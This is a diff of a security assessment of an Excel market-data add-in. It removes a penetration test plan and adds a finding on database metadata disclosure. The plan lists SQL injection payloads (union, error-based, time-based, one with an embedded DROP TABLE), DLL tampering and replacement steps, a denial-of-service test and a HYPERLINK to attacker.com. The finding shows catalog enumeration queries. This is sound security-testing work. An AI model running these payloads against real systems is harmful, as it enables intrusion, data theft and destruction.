@@ -1,383 +1,45 @@
-🎯 1. Installation & Binary Security
-🔹 Test Case 1: Digital Signature Validation
-
-Steps:
-
-Locate .dll (from Apps\2.0 folder)
-Right-click → Properties → Digital Signatures
-Verify:
-Valid signer
-Certificate chain
-
-Expected Issue:
-
-Unsigned / tampered DLL
-🔹 Test Case 2: DLL Tampering
-
-Steps:
-
-Copy DLL → backup
-Modify DLL (open in hex editor / dnSpy and change string)
-Replace original DLL
-Open Excel
-
-Check:
-
-Does add-in still load?
-
-Vulnerability:
-
-No integrity validation
-🔹 Test Case 3: File Permission Check
-
-Steps:
-
-Right-click DLL → Properties → Security
-Check:
-Write permission for normal user
-
-Vulnerability:
-
-Writable binary → privilege escalation
-🎯 2. Environment Manipulation
-🔹 Test Case 4: Default Environment Check
-
-Steps:
-
-=MKT1GetEnv()
-
-Check:
-
-Should NOT be PROD for testing
-🔹 Test Case 5: Switch to QA
-
-Steps:
-
-=MKT1SetEnv("QA",300)
-
-Then:
-
-=MKT1GetEnv()
-
-Check:
-
-Should show QA server
-🔹 Test Case 6: Environment Injection
-
-Steps:
-
-=MKT1SetEnv("QA'; DROP TABLE test--",300)
-
-Check:
-
-Error / execution
-
-Vulnerability:
-
-Injection in env function
-🎯 3. SQL Injection (CRITICAL)
-🔹 Test Case 7: Basic SQL Injection
-
-Steps:
-In Excel:
-
-=MKT1Data("' OR 1=1--", "2024-01-01", "2024-01-10", "NY", "FX")
-
-Check:
-
-More data returned than expected
-🔹 Test Case 8: Error-Based Injection
-=MKT1Data("' AND 1=CAST((SELECT @@version) AS INT)--",...)
-
-Check:
-
-DB error message appears
-🔹 Test Case 9: Time-Based Injection
-=MKT1Data("'; WAITFOR DELAY '0:0:5'--",...)
-
-Check:
-
-Delay in response
-🔹 Test Case 10: UNION Injection
-=MKT1Data("' UNION SELECT name FROM sysobjects--",...)
-
-Check:
-
-Unexpected DB metadata
-🎯 4. Parameter Manipulation
-🔹 Test Case 11: Invalid Input Types
-=MKT1Data(12345, "AAAA", NULL, "@@@", "")
-
-Check:
-
-Validation errors
-🔹 Test Case 12: Long Input (Buffer Test)
-=MKT1Data(REPT("A",5000),...)
-
-Check:
-
-Crash / truncation
-🎯 5. Authorization Testing
-🔹 Test Case 13: No TAM Role Access
-
-Steps:
-
-Use account without DB role
-Run:
-=MKT1Data(...)
-
-Check:
-
-Should fail
-🔹 Test Case 14: Privilege Escalation
-=MKT1Data("' UNION SELECT * FROM sysobjects--",...)
-
-Check:
-
-System tables accessible?
-🎯 6. Database Enumeration
-🔹 Test Case 15: List Tables
-' UNION SELECT name FROM sysobjects--
-🔹 Test Case 16: Column Discovery
-' UNION SELECT column_name FROM information_schema.columns--
-🎯 7. Registry Manipulation
-🔹 Test Case 17: Modify Registry
-
-Steps:
-
-Open regedit
-
-Navigate:
-
-Excel\Addins\Market1...
-Modify values
-
-Check:
-
-Add-in behavior changes?
-🎯 8. Configuration File Testing
-🔹 Test Case 18: Locate Config
-
-Steps:
-
-Go to DLL folder
-Look for .config
-
-Check:
-
-DB connection strings?
-Credentials?
-🎯 9. Network Testing
-🔹 Test Case 19: Traffic Capture
-
-Steps:
-
-Run Wireshark
-Execute Excel query
-
-Check:
-
-Plaintext data?
-Credentials?
-🎯 10. Log Analysis
-🔹 Test Case 20: View Logs
-
-Steps:
-
-Excel → Market One → View Logs
-Trigger error
-
-Check:
-
-SQL queries exposed?
-Stack trace?
-🎯 11. Reverse Engineering
-🔹 Test Case 21: Decompile DLL
-
-Steps:
-
-Open DLL in dnSpy
-
-Search:
-
-SQL
-SELECT
-connectionString
-
-Check:
-
-Hardcoded queries?
-DB endpoints?
-🎯 12. Excel Abuse
-🔹 Test Case 22: Mass Query Execution
-
-Steps:
-
-Press F9 repeatedly
-
-Check:
-
-Rate limiting?
-🔹 Test Case 23: Large Data Extraction
-=MKT1Data("EURUSD","2000-01-01","2025-01-01",...)
-
-Check:
-
-Large dump allowed?
-🎯 13. Denial of Service
-🔹 Test Case 24: Heavy Queries
-Use wide date range
-Multiple sheets
-
-Check:
-
-DB slowdown
-🎯 14. Driver Testing
-🔹 Test Case 25: Sybase Driver Tampering
-
-Steps:
-
-Replace driver (if possible)
-
-Check:
-
-Add-in behavior
-🎯 15. Persistence & Session
-🔹 Test Case 26: Environment Reset
-
-Steps:
-
-Set QA
-Close Excel
-Reopen
-
-Check:
-
-Resets to PROD?
-🎯 16. Formula Injection
-🔹 Test Case 27:
-=HYPERLINK("http://attacker.com","Click")
-🎯 17. File System Abuse
-🔹 Test Case 28:
-Replace DLL with malicious one
-🎯 18. Hardening Checks
-🔹 Test Case 29:
-Check:
-ASLR
-DEP
-
-Tools:
-
-PEStudio
-🎯 19. Data Leakage
-🔹 Test Case 30:
-Try accessing:
-Other asset classes
-Hidden data
-🎯 20. Edge Cases
-🔹 Test Case 31:
-Null values
-Empty parameters
-Special chars:
-' " ; -- < >
-
-
-
-
-🎯 1. Baseline Test (Understand Normal Behavior)
-Step:
-
-Use a valid query:
-
-=MKT1Data("EURUSD","2024-01-01","2024-01-05","NY","FX")
-Observe:
-Data format
-Response time
-Columns returned
-
-👉 This is your baseline to compare attacks
-
-🔴 2. SQL Injection Testing (MAIN FOCUS)
-🔹 Test 1: Basic Injection
-=MKT1Data("' OR 1=1--","2024-01-01","2024-01-05","NY","FX")
-Check:
-More rows than expected?
-Unexpected data?
-🔹 Test 2: Error-Based Injection
-=MKT1Data("' AND 1=CAST((SELECT @@version) AS INT)--","2024-01-01","2024-01-05","NY","FX")
-Check:
-Error message?
-DB info leakage?
-🔹 Test 3: Time-Based Injection
-=MKT1Data("'; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-05","NY","FX")
-Check:
-Delay in response (~5 sec)
-🔹 Test 4: UNION Injection
-=MKT1Data("' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-05","NY","FX")
-Check:
-Table names appear?
-🟠 3. Parameter Fuzzing
-🔹 Test:
-=MKT1Data("!!!!","AAAA","BBBB","@@@","###")
-Check:
-Crash?
-Error handling?
-🔹 Long Input
-=MKT1Data(REPT("A",5000),"2024-01-01","2024-01-05","NY","FX")
-🟡 4. Authorization Testing
-🔹 Test:
-Try accessing unexpected data
-=MKT1Data("TEST","2000-01-01","2025-01-01","ALL","ALL")
-Check:
-Excessive data access?
-🟡 5. Data Extraction Abuse
-🔹 Test:
-Large range
-=MKT1Data("EURUSD","2000-01-01","2025-01-01","NY","FX")
-Check:
-Bulk dump possible?
-🟡 6. Log Inspection
-Steps:
-Excel → Market One → View Logs
-Run failed payload
-Check:
-SQL query visible?
-Stack trace?
-DB info?
-🟡 7. Registry Manipulation
-Steps:
-Open:
-regedit
-Navigate:
-Excel\Addins\Market1...
-Modify values
-Check:
-Add-in still loads?
-Behavior changes?
-🟡 8. DLL Security Testing
-Steps:
-Locate DLL (Apps\2.0)
-Open in dnSpy
-Check:
-SQL query building
-Connection string
-🟡 9. File Permission Test
-Steps:
-Try editing DLL
-Check:
-Allowed or denied?
-🟡 10. Network Observation
-Steps:
-Start Wireshark
-Run Excel query
-Check:
-Plaintext traffic?
-Credentials?
-🟡 11. Environment Manipulation Edge Cases
-=MKT1SetEnv("INVALID",300)
-=MKT1SetEnv("'QA--",300)
-
-
-I’m unable to locate the actual installation path (DLL/manifest files) on my system for analysis.
-
-Could you please help share the installation directory
+Recommendation: Merge 1, 2 and 4
+Vulnerability Title
+
+Excessive Database Metadata and Security Information Disclosure
+
+Severity
+
+Medium
+
+Description
+
+The database account can enumerate internal database metadata including:
+
+User accounts
+Roles
+Groups
+Permission assignments
+Database objects
+Table names
+Stored procedure names
+Authorization structures
+
+The information is exposed through system catalog tables and administrative procedures.
+
+Evidence
+select name,suid,uid
+from sysusers
+select top 20 *
+from sysprotects
+sp_helprotect
+select name
+from sysobjects
+where type='U'
+Impact
+
+An attacker obtaining database access can:
+
+Enumerate privileged accounts
+Map authorization structures
+Identify sensitive objects
+Discover attack paths
+Facilitate privilege escalation attempts
+Severity
+
+Medium
